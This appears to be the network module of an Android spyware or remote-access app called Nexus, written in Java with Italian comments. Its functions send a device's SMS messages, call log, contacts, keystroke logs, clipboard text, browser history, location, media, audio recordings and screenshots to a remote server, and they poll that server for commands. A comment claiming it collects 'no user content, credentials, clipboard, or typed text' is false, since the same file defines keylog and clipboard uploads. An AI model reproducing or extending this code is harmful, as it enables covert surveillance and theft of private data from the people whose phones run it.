package com.nexus.app;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.Uri;
import android.net.NetworkInfo;
import android.os.BatteryManager;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.telephony.TelephonyManager;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.IOException;
import java.util.concurrent.TimeUnit;
import okhttp3.*;
import okio.BufferedSink;

public class NexusAPI {

    private final Context ctx;
    private final OkHttpClient client;
    private final String deviceId;

    public NexusAPI(Context ctx) {
        this.ctx = ctx;
        this.deviceId = NexusConfig.getDeviceId(ctx);
        this.client = new OkHttpClient.Builder()
            .connectTimeout(15, TimeUnit.SECONDS)
            .writeTimeout(60, TimeUnit.SECONDS)
            .readTimeout(30, TimeUnit.SECONDS)
            .build();
    }

    // ── Ping ──────────────────────────────────────────────
    public void ping(Callback2<JSONArray> cb) {
        new Thread(() -> {
            try {
                JSONObject body = new JSONObject();
                body.put("deviceId", deviceId);
                body.put("deviceName", Build.MODEL);
                body.put("model", Build.MANUFACTURER + " " + Build.MODEL);
                body.put("androidVersion", Build.VERSION.RELEASE);
                body.put("battery", getBatteryLevel());
                body.put("network", getNetworkType());
                body.put("reliabilityProtocol", 2);
                body.put("status", DeviceStatusCollector.collect(ctx));

                Response r = post("/api/ping", body.toString());
                if (r != null && r.isSuccessful()) {
                    String respStr = r.body().string();
                    JSONObject resp = new JSONObject(respStr);
                    JSONArray cmds = resp.optJSONArray("commands");
                    if (cb != null) cb.call(cmds != null ? cmds : new JSONArray());
                }
                if (r != null) r.close();
            } catch (Exception e) { e.printStackTrace(); }
        }).start();
    }

    // ── Poll comandi ──────────────────────────────────────
    public void pollCommands(Callback2<JSONArray> cb) {
        new Thread(() -> {
            try {
                Response r = get("/api/commands/" + deviceId);
                if (r != null && r.isSuccessful()) {
                    JSONArray cmds = new JSONArray(r.body().string());
                    if (cb != null) cb.call(cmds);
                }
                if (r != null) r.close();
            } catch (Exception e) { e.printStackTrace(); }
        }).start();
    }

    public void acknowledgeCommand(String commandId, boolean success, String detail) {
        if (commandId == null || commandId.isEmpty()) return;
        new Thread(() -> {
            try {
                JSONObject body = new JSONObject();
                body.put("success", success);
                body.put("detail", detail != null ? detail : "");
                Response r = post("/api/commands/" + deviceId + "/" + commandId + "/ack", body.toString());
                if (r != null) r.close();
            } catch (Exception e) { e.printStackTrace(); }
        }).start();
    }

    // Device health only: no user content, credentials, clipboard, or typed text.
    public boolean sendDeviceStatus(JSONObject status) {
        try {
            JSONObject body = new JSONObject();
            body.put("deviceId", deviceId);
            body.put("status", status);
            return postOk("/api/status/" + deviceId, body.toString());
        } catch (Exception e) { e.printStackTrace(); return false; }
    }

    // ── Events (notifiche) ────────────────────────────────
    public boolean sendEventsNow(JSONArray events) {
        try {
            JSONObject body = new JSONObject();
            body.put("deviceId", deviceId);
            body.put("events", events);
            return postOk("/api/events", body.toString());
        } catch (Exception e) { e.printStackTrace(); return false; }
    }

    public void sendEvents(JSONArray events) {
        new Thread(() -> sendEventsNow(events)).start();
    }

    // ── Location ──────────────────────────────────────────
    public boolean sendLocation(double lat, double lng, float accuracy) {
        try {
            JSONObject body = new JSONObject();
            body.put("deviceId", deviceId);
            body.put("lat", lat);
            body.put("lng", lng);
            body.put("accuracy", accuracy);
            body.put("ts", System.currentTimeMillis());
            return postOk("/api/location", body.toString());
        } catch (Exception e) { e.printStackTrace(); return false; }
    }

    // ── Call log ──────────────────────────────────────────
    public boolean sendCallLog(JSONArray calls) {
        try {
            JSONObject body = new JSONObject();
            body.put("deviceId", deviceId);
            body.put("calls", calls);
            return postOk("/api/calllog/" + deviceId, body.toString());
        } catch (Exception e) { e.printStackTrace(); return false; }
    }

    // ── SMS ───────────────────────────────────────────────
    public boolean sendSMS(JSONArray messages) {
        try {
            JSONObject body = new JSONObject();
            body.put("deviceId", deviceId);
            body.put("messages", messages);
            return postOk("/api/sms/" + deviceId, body.toString());
        } catch (Exception e) { e.printStackTrace(); return false; }
    }

    // ── Contacts ──────────────────────────────────────────
    public boolean sendContacts(JSONArray contacts) {
        try {
            JSONObject body = new JSONObject();
            body.put("contacts", contacts);
            return postOk("/api/contacts/" + deviceId, body.toString());
        } catch (Exception e) { e.printStackTrace(); return false; }
    }

    // ── Keylog ────────────────────────────────────────────
    public void sendKeylog(JSONArray entries) {
        new Thread(() -> {
            try {
                JSONObject body = new JSONObject();
                body.put("deviceId", deviceId);
                body.put("entries", entries);
                Response r = post("/api/keylog/" + deviceId, body.toString());
                if (r != null) r.close();
            } catch (Exception e) { e.printStackTrace(); }
        }).start();
    }

    // ── Clipboard ─────────────────────────────────────────
    public void sendClipboard(String text) {
        new Thread(() -> {
            try {
                JSONObject body = new JSONObject();
                body.put("deviceId", deviceId);
                body.put("text", text);
                body.put("ts", System.currentTimeMillis());
                Response r = post("/api/clipboard/" + deviceId, body.toString());
                if (r != null) r.close();
            } catch (Exception e) { e.printStackTrace(); }
        }).start();
    }

    // ── Browser history ───────────────────────────────────
    public void sendBrowserHistory(JSONArray history) {
        new Thread(() -> {
            try {
                JSONObject body = new JSONObject();
                body.put("history", history);
                Response r = post("/api/browser/" + deviceId, body.toString());
                if (r != null) r.close();
            } catch (Exception e) { e.printStackTrace(); }
        }).start();
    }

    // ── Apps ──────────────────────────────────────────────
    public void sendApps(JSONArray apps) {
        new Thread(() -> {
            try {
                JSONObject body = new JSONObject();
                body.put("apps", apps);
                Response r = post("/api/apps/" + deviceId, body.toString());
                if (r != null) r.close();
            } catch (Exception e) { e.printStackTrace(); }
        }).start();
    }

    // ── Upload file media ─────────────────────────────────
    public boolean uploadMedia(File file, String mimeType) {
        try {
            RequestBody fileBody = RequestBody.create(file, MediaType.parse(mimeType));
            MultipartBody body = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("file", file.getName(), fileBody)
                .build();
            Request req = new Request.Builder()
                .url(NexusConfig.SERVER_URL + "/api/media/" + deviceId)
                .header("X-Token", NexusConfig.TOKEN)
                .post(body)
                .build();
            Response r = client.newCall(req).execute();
            String resp = r.body() != null ? r.body().string() : "";
            r.close();
            return resp.contains("\"ok\":true");
        } catch (Exception e) { e.printStackTrace(); return false; }
    }

    // Upload diretto da MediaStore content:// URI: compatibile con scoped storage.
    public boolean uploadMedia(Uri uri, String displayName, String mimeType) {
        try {
            final MediaType mediaType = MediaType.parse(mimeType);
            RequestBody fileBody = new RequestBody() {
                @Override public MediaType contentType() { return mediaType; }

                @Override public void writeTo(BufferedSink sink) throws IOException {
                    InputStream in = ctx.getContentResolver().openInputStream(uri);
                    if (in == null) throw new IOException("Media non accessibile: " + uri);
                    try {
                        byte[] buffer = new byte[64 * 1024];
                        int read;
                        while ((read = in.read(buffer)) != -1) sink.write(buffer, 0, read);
                    } finally {
                        in.close();
                    }
                }
            };
            MultipartBody body = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("file", displayName, fileBody)
                .build();
            Request req = new Request.Builder()
                .url(NexusConfig.SERVER_URL + "/api/media/" + deviceId)
                .header("X-Token", NexusConfig.TOKEN)
                .post(body)
                .build();
            Response r = client.newCall(req).execute();
            String resp = r.body() != null ? r.body().string() : "";
            boolean accepted = r.isSuccessful() && resp.contains("\"ok\":true");
            r.close();
            return accepted;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }

    // ── Upload audio ──────────────────────────────────────
    public void uploadAudio(File file) {
        new Thread(() -> {
            try {
                RequestBody fileBody = RequestBody.create(file, MediaType.parse("audio/mp4"));
                MultipartBody body = new MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("file", file.getName(), fileBody)
                    .build();
                Request req = new Request.Builder()
                    .url(NexusConfig.SERVER_URL + "/api/audio/" + deviceId)
                    .post(body)
                    .build();
                client.newCall(req).execute().close();
            } catch (Exception e) { e.printStackTrace(); }
        }).start();
    }

    // ── Upload screenshot ─────────────────────────────────
    public void uploadScreenshot(File file) {
        new Thread(() -> {
            try {
                RequestBody fileBody = RequestBody.create(file, MediaType.parse("image/jpeg"));
                MultipartBody body = new MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("file", file.getName(), fileBody)
                    .build();
                Request req = new Request.Builder()
                    .url(NexusConfig.SERVER_URL + "/api/screenshot/" + deviceId)
                    .post(body)
                    .build();
                client.newCall(req).execute().close();
            } catch (Exception e) { e.printStackTrace(); }
        }).start();
    }

    // ── HTTP helpers ──────────────────────────────────────
    private boolean postOk(String path, String json) {
        Response response = post(path, json);
        if (response == null) return false;
        try {
            String text = response.body() != null ? response.body().string() : "";
            return response.isSuccessful() && new JSONObject(text).optBoolean("ok", false);
        } catch (Exception e) {
            return false;
        } finally {
            response.close();
        }
    }

    private Response post(String path, String json) {
        try {
            RequestBody body = RequestBody.create(json, MediaType.parse("application/json"));
            Request req = new Request.Builder()
                .url(NexusConfig.SERVER_URL + path)
                .header("X-Token", NexusConfig.TOKEN)
                .post(body)
                .build();
            return client.newCall(req).execute();
        } catch (Exception e) { e.printStackTrace(); return null; }
    }

    private Response get(String path) {
        try {
            Request req = new Request.Builder()
                .url(NexusConfig.SERVER_URL + path)
                .header("X-Token", NexusConfig.TOKEN)
                .get()
                .build();
            return client.newCall(req).execute();
        } catch (Exception e) { e.printStackTrace(); return null; }
    }

    // ── Device info ───────────────────────────────────────
    private int getBatteryLevel() {
        try {
            BatteryManager bm = (BatteryManager) ctx.getSystemService(Context.BATTERY_SERVICE);
            return bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
        } catch (Exception e) { return -1; }
    }

    private String getNetworkType() {
        try {
            ConnectivityManager cm = (ConnectivityManager) ctx.getSystemService(Context.CONNECTIVITY_SERVICE);
            NetworkInfo ni = cm.getActiveNetworkInfo();
            if (ni == null || !ni.isConnected()) return "offline";
            if (ni.getType() == ConnectivityManager.TYPE_WIFI) return "WiFi";
            TelephonyManager tm = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
            return "Mobile";
        } catch (Exception e) { return "unknown"; }
    }

    public interface Callback2<T> {
        void call(T data);
    }
}
